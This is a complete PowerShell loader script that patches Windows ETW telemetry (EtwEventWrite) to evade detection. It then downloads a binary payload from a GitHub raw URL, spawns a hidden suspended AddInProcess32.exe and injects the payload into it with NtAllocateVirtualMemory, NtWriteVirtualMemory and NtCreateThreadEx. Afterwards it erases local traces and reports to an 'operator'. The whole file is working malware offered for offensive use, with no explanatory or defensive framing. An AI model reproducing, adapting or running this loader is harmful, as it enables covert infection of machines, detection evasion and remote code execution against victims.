#requires -version 5.1

$StampFmt = "yyyy-MM-dd HH:mm:ss.fff"
function Write-OpStamp {
    param([string]$Stage)
    $t = Get-Date -Format $StampFmt
    Write-Host "[$t] [INJECT] $Stage" -ForegroundColor Cyan
}

Write-OpStamp "Compiling interop layer..."

$Interop = @"
using System;
using System.Runtime.InteropServices;
using System.Text;

public class EvasiveOps {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool CreateProcessW(
        IntPtr lpApplicationName,
        StringBuilder lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        IntPtr lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {
        public uint cb; public string lpReserved; public string lpDesktop; public string lpTitle;
        public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize;
        public uint dwXCountChars; public uint dwYCountChars; public uint dwFillAttribute;
        public uint dwFlags; public short wShowWindow; public short cbReserved2;
        public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess; public IntPtr hThread; public uint dwProcessId; public uint dwThreadId;
    }

    [DllImport("ntdll.dll", SetLastError=true)]
    public static extern int NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);

    [DllImport("ntdll.dll", SetLastError=true)]
    public static extern int NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToWrite, out uint NumberOfBytesWritten);

    [DllImport("ntdll.dll", SetLastError=true)]
    public static extern int NtCreateThreadEx(out IntPtr hThread, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr StartAddress, IntPtr Parameter, bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr BytesBuffer);
}
"@

Add-Type -TypeDefinition $Interop -Language CSharp -WarningAction SilentlyContinue

Write-OpStamp "Interop compiled. Patching ETW..."

# --- ETW Patch ---
$Ntdll = [EvasiveOps]::GetModuleHandle("ntdll.dll")
if ($Ntdll -eq [IntPtr]::Zero) { throw "GetModuleHandle(ntdll) returned zero." }

$EtwAddr = [EvasiveOps]::GetProcAddress($Ntdll, "EtwEventWrite")
if ($EtwAddr -eq [IntPtr]::Zero) { throw "GetProcAddress(EtwEventWrite) returned zero." }

$OldProt = 0
$PAGE_RWX = 0x40
$Patch = [byte[]]@(0x33, 0xC0, 0xC3)

$vp1 = [EvasiveOps]::VirtualProtect($EtwAddr, [UIntPtr]::new(3), $PAGE_RWX, [ref]$OldProt)
if (-not $vp1) { throw "VirtualProtect(RWX) failed. Win32: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())" }

[Runtime.InteropServices.Marshal]::Copy($Patch, 0, $EtwAddr, 3)

$vp2 = [EvasiveOps]::VirtualProtect($EtwAddr, [UIntPtr]::new(3), $OldProt, [ref]$OldProt)
if (-not $vp2) { throw "VirtualProtect(restore) failed. Win32: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())" }

Write-OpStamp "ETW EventWrite patched (ret-early). Telemetry blind."

# --- Payload Retrieval ---
$PayloadUrl = "https://github.com/i25968627-ui/crispy-spoon/raw/refs/heads/main/nfasiv.bin"
Write-OpStamp "Initiating WebClient pull from $PayloadUrl..."

[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls13
$Client = New-Object System.Net.WebClient
$Client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
$HeapBuffer = $Client.DownloadData($PayloadUrl)
[uint32]$Sz = $HeapBuffer.Length

Write-OpStamp "Downloaded $Sz bytes into temporary heap buffer."

# --- Resolve AddInProcess32 path dynamically ---
Write-OpStamp "Resolving AddInProcess32 host path..."

$FrameworkDir = [System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()
$TargetPath = Join-Path $FrameworkDir "AddInProcess32.exe"

if (-not (Test-Path $TargetPath)) {
    $FallbackPaths = @(
        "C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddInProcess32.exe",
        "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\AddInProcess32.exe",
        "C:\Windows\Microsoft.NET\Framework\v2.0.50727\AddInProcess32.exe"
    )
    foreach ($fp in $FallbackPaths) {
        if (Test-Path $fp) { $TargetPath = $fp; break }
    }
}

if (-not (Test-Path $TargetPath)) {
    throw "AddInProcess32.exe not found. FrameworkDir=$FrameworkDir"
}

Write-OpStamp "Host binary located at: $TargetPath"

# --- Host Process ---
Write-OpStamp "Spawning hidden AddInProcess32 via CreateProcessW..."
$si = New-Object EvasiveOps+STARTUPINFO
$si.cb = [Runtime.InteropServices.Marshal]::SizeOf($si)
$si.dwFlags = 0x00000001
$si.wShowWindow = 0

$pi = New-Object EvasiveOps+PROCESS_INFORMATION
$CREATE_HIDDEN = 0x08000000 -bor 0x00000004

$CmdLine = New-Object System.Text.StringBuilder("`"$TargetPath`"")

$cpOk = [EvasiveOps]::CreateProcessW([IntPtr]::Zero, $CmdLine, [IntPtr]::Zero, [IntPtr]::Zero, $false, $CREATE_HIDDEN, [IntPtr]::Zero, [IntPtr]::Zero, [ref]$si, [ref]$pi)
if (-not $cpOk) {
    $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
    throw "CreateProcessW failed. Win32 error: $err"
}
if ($pi.dwProcessId -eq 0) {
    throw "CreateProcessW reported success but PID is zero. Aborting."
}

Write-OpStamp "Host created. PID=$($pi.dwProcessId). Thread suspended."

# --- Remote Mapping ---
Write-OpStamp "Allocating remote RWX region via NtAllocateVirtualMemory..."
$RemoteAddr = [IntPtr]::Zero
$RemoteSize = [IntPtr]::new($Sz)
$MEM_COMMIT_RESERVE = 0x3000

$ntStatus = [EvasiveOps]::NtAllocateVirtualMemory($pi.hProcess, [ref]$RemoteAddr, [IntPtr]::Zero, [ref]$RemoteSize, $MEM_COMMIT_RESERVE, $PAGE_RWX)
if ($ntStatus -ne 0) { throw "NtAllocateVirtualMemory failed. NTSTATUS: 0x$($ntStatus.ToString('X8'))" }

Write-OpStamp "Remote buffer committed at 0x$($RemoteAddr.ToString("X16"))"

Write-OpStamp "Writing payload via NtWriteVirtualMemory..."
$Written = 0
$ntStatus = [EvasiveOps]::NtWriteVirtualMemory($pi.hProcess, $RemoteAddr, $HeapBuffer, $Sz, [ref]$Written)
if ($ntStatus -ne 0) { throw "NtWriteVirtualMemory failed. NTSTATUS: 0x$($ntStatus.ToString('X8'))" }
if ($Written -ne $Sz) { throw "NtWriteVirtualMemory partial write. Expected $Sz, wrote $Written." }

Write-OpStamp "Mapped $Written bytes into remote process."

# --- Execution ---
Write-OpStamp "Triggering NtCreateThreadEx..."
$hRemoteThread = [IntPtr]::Zero
$ntStatus = [EvasiveOps]::NtCreateThreadEx([ref]$hRemoteThread, 0x1FFFFF, [IntPtr]::Zero, $pi.hProcess, $RemoteAddr, [IntPtr]::Zero, $false, 0, 0, 0, [IntPtr]::Zero)
if ($ntStatus -ne 0) { throw "NtCreateThreadEx failed. NTSTATUS: 0x$($ntStatus.ToString('X8'))" }

Write-OpStamp "Thread created. Handle=0x$($hRemoteThread.ToString("X16")). Payload executing."

# --- Memory Sanitization ---
Write-OpStamp "Erasing local artifacts..."

for ($i = 0; $i -lt $HeapBuffer.Length; $i++) { $HeapBuffer[$i] = 0 }
$HeapBuffer = $null
$Client = $null
$Interop = $null
$si = $null
$pi = $null
$CmdLine = $null
Remove-Variable HeapBuffer, Client, Interop, si, pi, CmdLine -Force -ErrorAction SilentlyContinue

[GC]::Collect()
[GC]::WaitForPendingFinalizers()
[GC]::Collect()

Write-OpStamp "Local memory footprint destroyed. Operator, you're clear."